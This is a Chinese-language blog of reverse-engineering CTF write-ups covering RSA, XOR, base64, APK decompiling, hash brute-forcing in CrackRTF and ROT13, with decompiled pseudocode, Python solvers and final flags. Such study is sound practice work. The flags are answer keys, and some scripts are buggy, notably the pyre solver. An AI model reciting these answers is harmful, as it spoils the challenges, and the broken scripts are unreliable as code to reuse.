以上参考z1r0的代码，该函数的功能是将v8的字符串转换为16进制放入v9,然后就是下面的两个函数，gmpz_init_set_str和gmpz_powm 是GNU的高精度算法？？ 1234567891011__gmpz_init_set_str(v7, &quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;, 16LL);__gmpz_init_set_str(v6, v9, 16LL);__gmpz_init_set_str(v4, &quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;, 10LL);__gmpz_init_set_str(v5, &quot;65537&quot;, 10LL);__gmpz_powm(v6, v6, v5, v4);if ( __gmpz_cmp(v6, v7) )puts(&quot;GG!&quot;);elseputs(&quot;TTTTTTTTTTql!&quot;); 将ad939ff59~~这个字符串以16进制写入v7 将1034~~这个数字以10进制写入v4 将65537这个字符串以10进制写入v5 __gmpz_pown(v6,v6,v5,v4)，意思是计算v6的v5次方，并对v4取模，写入v6，现在我终于看明白了，v6相当于明文，v5相当于E，v4相当于N， rsa的加密算法：明文^E%N __gmpz_cmp是一个比较函数，看名字就知道了 rsa加密之后与ad939ff59~~这个函数作比较 我们先用因式分解工具来算出P和Q 12P：282164587459512124844245113950593348271Q：366669102002966856876605669837014229419 然后用rsatool求出d 记住要先选择number base，即进制，然后再输入数据。 D = 91646299298871237857836940212608056141193465208586711901499120163393577626813 上代码： 123456789101112import gmpy2import binasciiN = 103461035900816914121390101299049044413950405173712170434161686539878160984549E = 65537p = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419D = 91646299298871237857836940212608056141193465208586711901499120163393577626813C = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35M = gmpy2.powmod(C, D, N)print(binascii.unhexlify(hex(M)[2:])) https://blog.csdn.net/weixin_60553183/article/details/122084511 我得理一下，gmpy2是干嘛的。 下面是关于gmpy2的常见函数的使用 https://blog.csdn.net/weixin_43790779/article/details/108473984 powmod是求大整数x的y次幂m取余， b‘suctf{Pwn*@*hundred_years}’ xor (异或)首先用exeinfoPE判断一下 是64位的，没有加壳，然后用IDA 64位打开，找到main函数 然后就是分析主函数，输入v6,让v6和global作比较，由题目得知，如果如数v6的长度没有33，则直接跳转到LABLE_12的位置，输出Failed 然后就是分析伪代码 下面是脚本的编写： 12345678910111213141516lists = ['f',0x0A,'k',0x0C,'w','&amp;','O','.','@',0x11,\\ 'x',0x0D,'Z',';','U',0x11,'p',0x19,'F',0x1F,\\ 'v','&quot;','M','#','D',0x0E,'g',6,'h',0x0F,'G','2','O']for i in range(1,len(lists)): if (isinstance(lists[i],int)): lists[i] = chr(lists[i])string = ''.join(lists)flag = 'f'for i in range(1,len(lists)): flag += chr(ord(lists[i]) ^ ord(lists[i-1]))print(flag)print(len(lists)) 将伪代码中的单个字符保持不动，连起来的字符分开，十六进制的在前面填上0x进制符号，并删除后面的h，然后放入列表lists 将列表中的int类型转换位char类型，用isinstance( x, type)方法来比较 将列表中的元素转换为字符串，如果这时输出，那么十六进制的那一块将转换为空格 然后将字符串的字符一次进行异或运算，最终输出得到flag hello word（apk逆向）写在后面的话: apk反汇编推荐用jadx-gui和GDAE –正文– 参考资料：https://www.zhihu.com/question/29370382 使用apktool cmd+D，打开dos，找到apk的目录，然后键入 1apktool d 名字.apk 即可。 解出以上资源 12CD 进入CD ../ 进入上一层目录 但是我们需要的是.dex文件，所以此时应该再运行 1apktool d -s -f 名字.apk -s 不反编译dex文件，而是将其保留 -f 如果目标文件夹存在，则删除后重新反编译 d 反编译apk文件 将修改完的apk重新打包 1apktool b 目录名 -o newtest.apk -b build -o 新的文件名 使用dex2jar工具 参考链接：https://www.jianshu.com/p/dbe579f6cc84 将apktool反汇编所得文件的classes.dex复制到dex2jar.bat所在目录 我的存放地址是：C:\\Users\\Lenovo\\Desktop\\dex2jar-2.0 然后在命令行中键入 1d2j-dex2jar classes.dex 生成了一个class-dex2jar.jar文件，就是反编译后的java源码文件 使用jd-gui.exe运行生成的反编译的Java源码 然后用jd-gui.exe运行生成的class-dex2jar.jar文件，就可以看到源码了 reverse_3 (base64) 1if ( !strncmp(Dest, Str2, v6) ) strncmp()函数，str2与Dest作比较，最多比较前v6个字符串长度 结果为0，则两个字符串相等 1strncpy(Dest, v5, 40u); strncpy()函数，v5复制到Dest字符数组中，长度为40u 1memset(str,'$',7) memset()函数，将符号‘$’复制到str字符数组中，长度为7 根据大佬写的知乎，发现这个是base64的编码，好家伙，python两行搞完。 12345678910111213import base64str1 = &quot;e3nifIH9b_C@n@dH&quot;lists = [i for i in str1]str2 = ''for i in range(len(lists)): lists[i] = chr(ord(lists[i])-i) str2 += lists[i]print(str2)str3 = base64.b64decode(str2)print(str3) Simple_Rev (ADI小端存储)参考链接 今天吃了个大亏 ADA里面的字符存储是小端存储 小端存储就是低地址存放到底位上，高地址存放到高位上。 以下是小端存储模式下的0x123456的存储，明显看到次序是颠倒的 所以，遇到这种直接把字符需要小心，先转换一下次序再说 首先我们测一下这个exe文件是否有壳 说句实话，我看不出来，貌似有一个压缩壳，然后是需要64位的Ada使用 打开之后看一下伪代码 主要是进Decry()函数看一下，进去之后就是新世界 这边就是主要算法了 这种的意思是字母大写转换为小写，key由大写转换为小写 通过循环上面的得知， key = ‘adsfkndcls’ text = ‘killshadow’ 看一下算法主题，就是一个while()循环，输入字符，如果碰到换行符直接退出。 12345678910111213141516171819202122232425262728key = 'adsfkndcls'text = 'killshadow'flag = ''#flag长度n = len(text)for i in range(n): #ASCII码一共128个，依次循环 for j in range(128): #不是字符，直接下一次循环 if j &lt; ord('A') or j &gt; ord('z') \\ or (j &lt; ord('a') and j &gt; ord('Z')): continue #枚举 if (j - 39 - ord(key[n % 10]) +97) %26 +97 \\ == ord(text[i]): flag += chr(j) n += 1 breakprint(flag) 就是要把题目给理解透彻了才行 题目的意思是如果不是字母（大写小写皆可），就直接退出，如果是字母，就执行下面的转换，转换的里面还挺复杂的，所以直接就暴力枚举。 判断是不是字母还有点小绕 [GXYCTF2019]luck_guy (ADI小端存储)1234567891011121314151617f1 = &quot;GXY{do_not_&quot;#小端，所以逆一下f2 = 'fo`guci'[::-1]lists = [i for i in f2]for j in range(0,8): if j%2 == 1: lists[j] = chr(ord(lists[j]) -2) else: lists[j] = chr(ord(lists[j]) -1)string = ''.join(lists)print(f1+string) memset参考文档http://c.biancheng.net/view/231.html memset()是初始化内存的万能函数，初始化之后，再向内存空间中存放需要的值，一般来说使用“0”初始化内存单元，通常给数组或结构体进行初始化，其实相当于结束标志‘\\0’,最后面的参数是长度，一般专业一点会写sizeof(XX) 123456789101112int main(){ char f1[] = &quot;GXY{do_not_&quot;; char f2[] = &quot;hate_me}&quot;; char flag[20]; memset(flag,0,20); printf(&quot;%s&quot;,flag); strcat(flag,f1); strcat(flag,f2); puts(flag); return 0;} 所以基础很重要啊！！！ 首先我们来分析一下题目， 进入patch_me函数 再进入get_flag函数 1234567891011121314151617181920212223242526272829303132333435363738v7 = __readfsqword(40u); v0 = time(0LL); srand(v0); for ( i = 0; i &lt;= 4; ++i ) { switch ( rand() % 200 ) { case 1: puts(&quot;OK, it's flag:&quot;); memset(&amp;s, 0, 40uLL); strcat((char *)&amp;s, f1); strcat((char *)&amp;s, &amp;f2); printf(&quot;%s&quot;, &amp;s); break; case 2: printf(&quot;Solar not like you&quot;); break; case 3: printf(&quot;Solar want a girlfriend&quot;); break; case 4: v6 = 0; s = 'fo`guci'; strcat(&amp;f2, (const char *)&amp;s); break; case 5: for ( j = 0; j &lt;= 7; ++j ) { if ( j % 2 == 1 ) char_1 = *(&amp;f2 + j) - 2; else char_1 = *(&amp;f2 + j) - 1; *(&amp;f2 + j) = char_1; } break; default: puts(&quot;emmm,you can't find flag 23333&quot;); break; 产生一个随机数，并进入switch结构，我们可以看出，按照4、5、1的顺序，就能求出flag，记得要注意ADI的小端优先 代码如下： 12345678910111213141516flag = 'GXY{do_not_'f2 = [0x7F, 0x66, 0x6F, 0x60, 0x67, 0x75, 0x63, 0x69][::-1]print(f2)ss = ''final = ''for i in range(8): if i % 2 == 1: s = chr(f2[i] - 2) else: s = chr(f2[i] - 1) flag += sprint(flag) flag{do_not_hate_me} 刮开有奖 (ASCII排序+base64) 首先查壳，分析一下是32位的程序，没有壳，所以用ida32打开 DialogFunc是一个函数，咱们跟进去 1234567891011121314151617181920212223242526272829303132333435if ( strlen(String) == 8 ) { str1[0] = 'Z'; str1[1] = 'J'; str2 = 'S'; str3 = 'E'; str4 = 'C'; str5 = 'a'; str6 = 'N'; str7 = 'H'; str8 = '3'; str9 = 'n'; str10 = 'g'; my_results(str1, 0, 10); memset(v18, 0, 0xFFFFu); v18[0] = String[5]; v18[2] = String[7]; v18[1] = String[6]; v4 = base_64(v18, strlen(v18)); memset(v18, 0, 0xFFFFu); v18[1] = String[3]; v18[0] = String[2]; v18[2] = String[4]; v5 = base_64(v18, strlen(v18)); if ( String[0] == str1[0] + 34 &amp;&amp; String[1] == str4 &amp;&amp; 4 * String[2] - 141 == 3 * str2 &amp;&amp; String[3] / 4 == 2 * (str7 / 9) &amp;&amp; !strcmp(v4, &quot;ak1w&quot;) &amp;&amp; !strcmp(v5, &quot;V1Ax&quot;) ) { MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0); } } return 0; 查看定义的字符的汇编代码 可以发现其实就是一连串的连续空间，就是一个字符数组 然后进入一个函数，看参数，第二个是0，第三个是10,既然看不懂，就直接把它改一改，放到vscode里面运行一下，因为我们知道它的参数了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# include &lt;stdio.h&gt;int my_results (char arr[], int a, int b){ int result; // eax int i; // esi int v5; // ecx int v6; // edx result = b; for ( i = a; i &lt;= b; a = i ) { v5 = i; v6 = arr[i]; if ( a &lt; result &amp;&amp; i &lt; result ) { do { if ( v6 &gt; arr[result] ) { if ( i &gt;= result ) break; ++i; arr[v5] = arr[result]; if ( i &gt;= result ) break; while ( arr[i] &lt;= v6 ) { if ( ++i &gt;= result ) goto LABEL_13; } if ( i &gt;= result ) break; v5 = i; arr[result] = arr[i]; } --result; } while ( i &lt; result ); }LABEL_13: arr[result] = v6; my_results(arr, a, i - 1); result = b; ++i; } return result;}int main(){ char arr[20] = {90,74,83,69,67,97,78,72,51,110,103}; puts(arr); my_results(arr, 0, 10); puts(arr); return 0;} 不怎么接触c语言，昨天才知道，*（a+i）其实相当于数组a[i],a是基准地址，i是偏移量，后面我就知道了，这个函数的形参的第一个其实就是字符数组，之前定义的。 运行完成后，其实就是对定义的字符进行了排序，有ASCII从小到大排序 再看这边，String就是我们输入的数字 用v18这个数组来存储，然后把v18放置在函数中，第二个参数是长度 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758v2 = a2 / 3; v3 = 0; if ( a2 % 3 &gt; 0 ) ++v2; v4 = 4 * v2 + 1; v5 = malloc(v4); v6 = v5; v15 = v5; if ( !v5 ) exit(0); memset(v5, 0, v4); v7 = a2; v8 = v6; v16 = v6; if ( a2 &gt; 0 ) { while ( 1 ) { v9 = 0; v10 = 0; v18 = 0; do { if ( v3 &gt;= v7 ) break; ++v10; v9 = *(v3 + a1) | (v9 &lt;&lt; 8); ++v3; } while ( v10 &lt; 3 ); v11 = v9 &lt;&lt; (8 * (3 - v10)); v12 = 0; v17 = v3; for ( i = 18; i &gt; -6; i -= 6 ) { if ( v10 &gt;= v12 ) { *(&amp;v18 + v12) = (v11 &gt;&gt; i) &amp; 0x3F; v8 = v16; } else { *(&amp;v18 + v12) = 64; } *v8++ = byte_407830[*(&amp;v18 + v12++)]; v16 = v8; } v3 = v17; if ( v17 &gt;= a2 ) break; v7 = a2; } v6 = v15; } result = v6; *v8 = 0; return result;} 用z1r0的话就是盲猜是base64解码 这边会有移动，是base64的最明显的特征，把这个函数取名为base_64，后面还有一个base64的编码 这边就很简单了，注意，str1[0]的值是排序完成之后的值 ZJSECaNH3ng 3CEHJNSZagn str1[0] = 3, string[0] = U str4 = J, string[1] = J string [3] = P 1234a = 'Z'b = 'Z'print(chr(ord(a)+34))print(chr(int(ord(b)/9*8))) 最后结合起来string，即flag{UJWP1jMp} [BJDCTF2020]JustRE （水题） 既然程序看不懂，就找找字符列表中，有没有能看懂的，发现最后有个可疑字符 咱们点进去 内存中的数字直接按住tab是不能显示伪代码的,得点击函数才行 然后就是读一下程序 我认为上面的19999是鼠标点击的次数，点击这么多次后，然后就会弹出flag sprintf函数，共有三个参数，第二个是格式，第一个是需要赋值的字符串，后面两个是被格式化的变量，所以flag{1999902069a45792d233ac} 简单注册器(apk逆向)写在后面的话: apk反汇编推荐用jadx-gui或GDAE 首先用apkide打开apk文件 打开apkIDE,然后把apk文件拖到右边（不是直接将apk拖入apkIDE） 等它自动转换后，找到输出目录 直接复制到地址栏跳转，找到MainActivity.class文件 最后将这个文件用jd-gui打开 so easy 然后就是阅读程序 123456789101112131415161718192021222324252627282930313233package com.example.flag;import android.view.View;import android.widget.EditText;import android.widget.TextView;class null implements View.OnClickListener { public void onClick(View paramView) { int i = 1; String str = editview.getText().toString(); if (str.length() != 32 || str.charAt(31) != 'a' || str.charAt(1) != 'b' || str.charAt(0) + str.charAt(2) - 48 != 56) i = 0; if (i == 1) { char[] arrayOfChar = &quot;dd2940c04462b4dd7c450528835cca15&quot;.toCharArray(); arrayOfChar[2] = (char)(arrayOfChar[2] + arrayOfChar[3] - 50); arrayOfChar[4] = (char)(arrayOfChar[2] + arrayOfChar[5] - 48); arrayOfChar[30] = (char)(arrayOfChar[31] + arrayOfChar[9] - 48); arrayOfChar[14] = (char)(arrayOfChar[27] + arrayOfChar[28] - 97); for (i = 0;; i++) { String str1; if (i &gt;= 16) { str1 = String.valueOf(arrayOfChar); textview.setText(&quot;flag{&quot; + str1 + &quot;}&quot;); return; } String str2 = str1[31 - i]; str1[31 - i] = str1[i]; str1[i] = str2; } } textview.setText(&quot;); }} 字符数组转换一下，然后再反向一下 123456789101112string = &quot;dd2940c04462b4dd7c450528835cca15&quot;lists = [i for i in string]lists[2] = chr((ord(lists[2]) + ord(lists[3]) - 50))lists[4] = chr((ord(lists[2]) + ord(lists[5]) - 48))lists[30] = chr((ord(lists[31]) + ord(lists[9]) - 48))lists[14] = chr((ord(lists[27]) + ord(lists[28]) - 97))string = ''.join(lists)print(string[::-1]) flag{“59acc538825054c7de4b26440c0999dd”} findit(apk逆向)写在后面的话: apk反汇编推荐用jadx-gui或GDAE –正文– 好家伙，做一个安卓题目就新换一个工具，这次用的是安卓杀手， z1r0的博客里说，{ 的ascii码是123，十六进制是0x7b, 123456texts = [0x70,0x76,0x6b,0x71,0x7b,0x6d,0x31,0x36,0x34,0x36, 0x37, 0x35,\\0x32,0x36,0x32,0x30,0x33,0x33,0x6c,0x34,0x6d,0x34,0x39,0x6c,0x6e,0x70,0x37,\\0x70,0x39,0x6d,0x6e,0x6b,0x32,0x38,0x6b,0x37,0x35,0x7d]for i in texts: print(chr(i),end = '') pvkq{m164675262033l4m49lnp7p9mnk28k75} 说实话结果很像了， 然后就是凯撒加密，偏移量为10，解密之后就是： flag{c164675262033b4c49bdf7f9cda28a75} pyre(%的逆推)在线反汇编pyr 然后分析一下代码 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationprint 'Welcome to Re World!'print 'Your input1 is your flag~'l = len(input1)for i in range(l): num = ((input1[i] + i) % 128 + 128) % 128 code += numfor i in range(l - 1): code[i] = code[i] ^ code[i + 1]print codecode = [ '\\x1f', '\\x12', '\\x1d', '(', '0', '4', '\\x01', '\\x06', '\\x14', '4', ',', '\\x1b', 'U', '?', 'o', '6', '*', ':', '\\x01', 'D', ';', '%', '\\x13'] 最后输出的code已经给出了 首先是异或一下，从最后一个元素开始 for i in range(l-2,-1,-1),倒数第二个元素和最后一个元素异或，以此类推 然后就是关于%~~公式的逆向了 关于z1r0的分析，就是以上这样，反过来就是(input[i] - i)%128 12345678910111213141516171819202122232425262728293031323334353637code = [ '\\x1f', '\\x12', '\\x1d', '(', '0', '4', '\\x01', '\\x06', '\\x14', '4', ',', '\\x1b', 'U', '?', 'o', '6', '*', ':', '\\x01', 'D', ';', '%', '\\x13']flag = ''l = len(code)for i in range(-2,-1,-1): code[i] = code[i] ^ code[i-1]print(code)for i in range(l): flag = chr((ord(code[i]) - i) % 128)print(code)print(flag) [ACTF新生赛2020]easyre(index的推导)参考链接：https://www.cnblogs.com/Mayfly-nymph/p/12664201.html 先是查壳，然后万能脱壳工具脱一下，然后放到ADI中看看 好家伙，7.5版本和7.0版本是打开是不一样的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455 1 int __cdecl main(int argc, const char **argv, const char **envp) 2 { 3 char v4; // [esp+12h] [ebp-2Eh] 4 char v5; // [esp+13h] [ebp-2Dh] 5 char v6; // [esp+14h] [ebp-2Ch] 6 char v7; // [esp+15h] [ebp-2Bh] 7 char v8; // [esp+16h] [ebp-2Ah] 8 char v9; // [esp+17h] [ebp-29h] 9 char v10; // [esp+18h] [ebp-28h]10 char v11; // [esp+19h] [ebp-27h]11 char v12; // [esp+1Ah] [ebp-26h]12 char v13; // [esp+1Bh] [ebp-25h]13 char v14; // [esp+1Ch] [ebp-24h]14 char v15; // [esp+1Dh] [ebp-23h]15 int v16; // [esp+1Eh] [ebp-22h]16 int v17; // [esp+22h] [ebp-1Eh]17 int v18; // [esp+26h] [ebp-1Ah]18 __int16 v19; // [esp+2Ah] [ebp-16h]19 char v20; // [esp+2Ch] [ebp-14h]20 char v21; // [esp+2Dh] [ebp-13h]21 char v22; // [esp+2Eh] [ebp-12h]22 int v23; // [esp+2Fh] [ebp-11h]23 int v24; // [esp+33h] [ebp-Dh]24 int v25; // [esp+37h] [ebp-9h]25 char v26; // [esp+3Bh] [ebp-5h]26 int i; // [esp+3Ch] [ebp-4h]27 28 __main();29 v4 = 42;30 v5 = 70;31 v6 = 39;32 v7 = 34;33 v8 = 78;34 v9 = 44;35 v10 = 34;36 v11 = 40;37 v12 = 73;38 v13 = 63;39 v14 = 43;40 v15 = 64;41 printf(&quot;Please input:&quot;);42 scanf(&quot;%s&quot;, &amp;v19);43 if ( (_BYTE)v19 != 65 || HIBYTE(v19) != 67 || v20 != 84 || v21 != 70 || v22 != 123 || v26 != 125 )44 return 0;45 v16 = v23;46 v17 = v24;47 v18 = v25;48 for ( i = 0; i &lt;= 11; ++i )49 {50 if ( *(&amp;v4 + i) != _data_ start__[*((char *)&amp;v16 + i) - 1] )51 return 0;52 }53 printf(&quot;You are correct!&quot;);54 return 0;55 } 这多清晰。。。 感谢z1r0的指导！ 所以第50行相当于，v4[i] ！= byte_402000[v16[i] - 1] 以下是python脚本 12345678910111213key = '~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\\'&amp;%$# !&quot;' #'一定要加\\encrypt = [42,70,39,34,78,44,34,40,73,63,43,64]x = []for i in range(len(encrypt)): m = key.find(chr(encrypt[i]))+1 x.append(chr(m))for i in range(len(x)): print(x[i],end = '') 仔细想了一下，用公式推一下就好理解了： 12345v4[i] == key [v16[i] - 1]key.find(v4[i]) == v16[i] - 1v16[i] == key.find(v4[i]) +1 v16这个数组就相当于是flag,我们需要做的就是逆着推一下。 flag{U9X_1S_W6@T?} rsa (非对称解密)非常6+1的重要！！ 参考链接： https://blog.csdn.net/ao52426055/article/details/110221943 https://blog.csdn.net/kevin66654/article/details/54087647 首先直接把两个文件的后缀改成.txt的 可以看到pub是个公钥解析，我们放到随便一个RSA公钥分解的网站中分解，解除模数和指数 key长度： 256 模数N： 8693448229604811919066606200349480058890565601720302561721665405 8378322103517 指数e： 65537 (0x10001) 然后分解N [http://factordb.com/index.php?query=8693448229604811919066606200349480058890565601720302561721665405%208378322103517](http://factordb.com/index.php?query=8693448229604811919066606200349480058890565601720302561721665405 8378322103517) P：285960468890451637935629440372639283459 q: 304008741604601924494328155975272418463 得知p、q、r、e之后，直接用rsatool2解出d 81176168860169991027846870170527607562179635470395365333547868786951080991441 算出来之后 通过这五个值，e、n、p、q、d来计算最后的值 记得要安装一下rsa库 dos直接键入： pip3 install rsa 上代码： 12345678910111213import rsae= 65537n= 86934482296048119190666062003494800588905656017203025617216654058378322103517p= 285960468890451637935629440372639283459q= 304008741604601924494328155975272418463d= 81176168860169991027846870170527607562179635470395365333547868786951080991441key = rsa.PrivateKey(n,e,d,q,p) #在pkcs标准中,pkcs#1规定,私钥包含(n,e,d,p,q)with open(&quot;E:\\\\A_Oasis\\\\逆向工程文件\\\\Reverse题目\\\\rsa\\\\output\\\\flagenc.txt&quot;,&quot;rb&quot;) as f: #以二进制读模式，读取密文 f = f.read() print(rsa.decrypt(f,key)) # f:公钥加密结果 key:私钥 b’flag{decrypt_256}\\n’ [ACTF新生赛2020]rome(ASCII暴力破解)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667int func(){ int result; // eax int v1[4]; // [esp+14h] [ebp-44h] unsigned __int8 v2; // [esp+24h] [ebp-34h] BYREF unsigned __int8 v3; // [esp+25h] [ebp-33h] unsigned __int8 v4; // [esp+26h] [ebp-32h] unsigned __int8 v5; // [esp+27h] [ebp-31h] unsigned __int8 v6; // [esp+28h] [ebp-30h] int v7; // [esp+29h] [ebp-2Fh] int v8; // [esp+2Dh] [ebp-2Bh] int v9; // [esp+31h] [ebp-27h] int v10; // [esp+35h] [ebp-23h] unsigned __int8 v11; // [esp+39h] [ebp-1Fh] char v12[29]; // [esp+3Bh] [ebp-1Dh] BYREF strcpy(v12, &quot;Qsw3sj_lz4_Ujw@l&quot;); printf(&quot;Please input:&quot;); scanf(&quot;%s&quot;, &amp;v2); result = v2; if ( v2 == 'A' ) { result = v3; if ( v3 == 'C' ) { result = v4; if ( v4 == 'T' ) { result = v5; if ( v5 == 'F' ) { result = v6; if ( v6 == '{' ) { result = v11; if ( v11 == '}' ) { v1[0] = v7; v1[1] = v8; v1[2] = v9; v1[3] = v10; *&amp;v12[17] = 0; while ( *&amp;v12[17] &lt;= 15 ) { if ( *(v1 + *&amp;v12[17]) &gt; 64 &amp;&amp; *(v1 + *&amp;v12[17]) &lt;= 90 ) *(v1 + *&amp;v12[17]) = (*(v1 + *&amp;v12[17]) - 51) % 26 + 65; if ( *(v1 + *&amp;v12[17]) &gt; 96 &amp;&amp; *(v1 + *&amp;v12[17]) &lt;= 122 ) *(v1 + *&amp;v12[17]) = (*(v1 + *&amp;v12[17]) - 79) % 26 + 97; ++*&amp;v12[17]; } *&amp;v12[17] = 0; while ( *&amp;v12[17] &lt;= 15 ) { result = v12[*&amp;v12[17]]; if ( *(v1 + *&amp;v12[17]) != result ) return result; ++*&amp;v12[17]; } return printf(&quot;You are correct!&quot;); } } } } } } return result;} 在检查没有壳之后，直接IDA打开，然后进入这个函数，其实就是输入一段字符之后，进行一系列的转换，根据z1r0的知乎得知，可以运用暴力破解（太棒了）！ 123456789101112131415161718192021string = 'Qsw3sj_lz4_Ujw@l'flag = ''for i in range(len(string)): for j in range(128): k = j if j &gt; 64 and j &lt;= 90: j = (j - 51) % 26 + 65 if j &gt; 96 and j &lt;= 122: j = (j - 79) % 26 + 97 if j == ord(string[i]): flag += chr(k) print(flag) 字符已经给出 循环这个这个字符串，用变量k来保存j的值，j来循环ASCII码，如果j经过转换之后，与对应的string相等，那就是flag了。 CrackRTF1 (散列算法+Win32API+文件头)这题对于我这种re新手，确实属于难度的天花板了…… 首先是查壳，发现没有壳。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152int __cdecl main_0(int argc, const char **argv, const char **envp){ DWORD v3; // eax DWORD v4; // eax char Str[260]; // [esp+4Ch] [ebp-310h] BYREF int v7; // [esp+150h] [ebp-20Ch] char String1[260]; // [esp+154h] [ebp-208h] BYREF char Destination[260]; // [esp+258h] [ebp-104h] BYREF memset(Destination, 0, sizeof(Destination)); memset(String1, 0, sizeof(String1)); v7 = 0; printf(&quot;pls input the first passwd(1): &quot;); scanf(&quot;%s&quot;, Destination); if ( strlen(Destination) != 6 ) { printf(&quot;Must be 6 characters!\\n&quot;); ExitProcess(0); } v7 = atoi(Destination); if ( v7 &lt; 100000 ) ExitProcess(0); strcat(Destination, &quot;@DBApp&quot;); v3 = strlen(Destination); sub_40100A((BYTE *)Destination, v3, String1); if ( !_strcmpi(String1, &quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;) ) { printf(&quot;continue...\\n\\n&quot;); printf(&quot;pls input the first passwd(2): &quot;); memset(Str, 0, sizeof(Str)); scanf(&quot;%s&quot;, Str); if ( strlen(Str) != 6 ) { printf(&quot;Must be 6 characters!\\n&quot;); ExitProcess(0); } strcat(Str, Destination); memset(String1, 0, sizeof(String1)); v4 = strlen(Str); sub_401019((BYTE *)Str, v4, String1); if ( !_strcmpi(&quot;27019e688a4e62a649fd99cadaafdb4e&quot;, String1) ) { if ( !(unsigned __int8)sub_40100F(Str) ) { printf(&quot;Error!!\\n&quot;); ExitProcess(0); } printf(&quot;bye ~~\\n&quot;); } } return 0;} 又触碰盲区了，再参考一下大佬z1r0的博客： https://www.zhihu.com/people/xu-xu-xuxu-94 这边先是输入第一个password, 1scanf(&quot;%s&quot;, Destination); 然后就要当心了 1v7 = atoi(Destination); 根据z1r0所说，atoi在pawnh中很常见，用于将字符串转换为整形 1if ( v7 &lt; 100000 ) 所以我们确定了第一个password的位数是6位，并且不小于100000 1strcat(Destination, &quot;@DBApp&quot;); 然后是与“@DBApp”连接 1strcat(Destination, &quot;@DBApp&quot;); 进入了一个奇奇怪怪的函数，不要害怕 1if ( CryptCreateHash(phProv, 0x8004u, 0, 0, &amp;phHash) ) 直接进大本营干这个函数，第二个参数是属于加密的类型，跟进去看 发现，08004是sha1哈希算法，就把main函数的里面的改成sha1(改名很重要) 1sha1(Destination, v3, String1); v3是长度，String1就是加密之后的数值了，然后与”6E32D0943418C2C33385BC35A1470250DD8923A9”作比较，python里面需要小写才行 然后就是编写算法 1234567891011121314151617181920import hashlib#大写转小写string = &quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;.lower()a = '@DBApp'for i in range(100000,999999): data = str(i) + a sha1 = hashlib.sha1(data.encode(&quot;utf-8&quot;)) flags = sha1.hexdigest() if flags == string: print(data) breakprint('done') 解出来之后就是123321@DBApp 在往下看，输入第二个密码，既然知道是第二个密码了，就提前把str改成second_password 1234printf(&quot;pls input the first passwd(2): &quot;);memset(second_password, 0, sizeof(Str));scanf(&quot;%s&quot;, Str);if ( strlen(Str) != 6 ) 长度也是6位 1strcat(second_password, Destination); 把第一个密码的值加到第二个密码后面 1sub_401019(second_password, v4, String1); 又进入了一个奇奇怪怪的函数，和上面一个差不多，加密之后与”27019e688a4e62a649fd99cadaafdb4e”进行比较 1if ( CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash) ) 这边的编码参数是0x8003，这个是MD5的哈希算法，看似可以直接暴力，但是，题目中并没有像第一个password一样，告诉我们类型以及范围，如果要暴力，就需要把ASCII全部循环一遍，所以还是想想别的办法。 发现这边还有函数，参数还是第二个密码 进去直接好家伙，一堆win32的API，在官网上面找找到底是什么意思。 官方API链接：https://docs.microsoft.com/en-us/windows/win32/api/ 先是FindResourceA 函数，粗略的看一遍之后，说的第一个参数是啥啥句柄，第二个参数是资源名称，第三个是资源类型，返回的是指定信息块的句柄 再看SizeofResource,返回值为资源中的字节数 同样的，LoadResource，没见过，最好都看看 返回值为资源关联的数据的句柄。 再看LockResource 返回值为指向资源第一个字节的指针 createFileA,用来创建，或者打开文件 最重要的来了，关于WriteFileA的 还有它的形参： 1sub_401005(lpString, lpBuffer, nNumberOfBytesToWrite); 这个函数把我们的总password放入第一个形参，lpBuffer是一个指针， 123456789v5 = lstrlenA(lpString); for ( i = 0; ; ++i ) { result = i; if ( i &gt;= a3 ) break; *(i + a2) ^= lpString[i % v5]; } return result; 现在就是这关键的地方了 a2也就是我们的lpBuffer,经过异或之后，成为我们需要生成文件，即rtf的头，才能传入下面WriteFile中，根据z1r0的博客所说，rtf的头一般为{\\rtf1\\ansi， 而AAA这个文件我们可以用Resource Hacker打开，只要查看开头6个就行了 然后就是匹配算法 123456789rtf = '{\\\\rtf1'AAA = [0x05,0x7D,0x41,0x15,0x26,0x01]flag = &quot;&quot;for i in range(0, len(rtf)): flag += chr(ord(rtf[i]) ^ AAA[i])print(flag) 结果为：~!3a@0 程序的意思是输入第二个密码之后，生成一个rtf文件,最后输出的rtf中，就是最终的答案 如你所见，flag{N0_M0re_Free_Bugs} login (JS逆向/凯撒)第一次做网页的逆向题目，有点激动，F12进入源代码查看 哪里不会搜哪里，返回一个element对象？？ 好吧，只是键入最基本的按钮值而已 主要是下面的rotFlag 1234567891011&lt;script type=&quot;text/javascript&quot;&gt; document.getElementById(&quot;prompt&quot;).onclick = function () { var flag = document.getElementById(&quot;flag&quot;).value; var rotFlag = flag.replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);}); if (&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot; == rotFlag) { alert(&quot;Correct flag!&quot;); } else { alert(&quot;Incorrect flag, rot again&quot;); } } &lt;/script&gt; charCodeAt(),返回第一个位置的Unicode编码， 再看看replace()方法，如果找到第一个参数的字符串，就被第二个参数替换 fromCharCode()相当于python里面的chr() 参考链接：https://www.zhihu.com/people/xu-xu-xuxu-94 后面不太懂了，根据z1r0的知乎中写到，flag.replace(/[a-zA-Z]/g，function(c){XXX})，是让flag中的a-z,A-Z字符，被后面的function(c)所替换。 后面的算法就是rot13算法了： 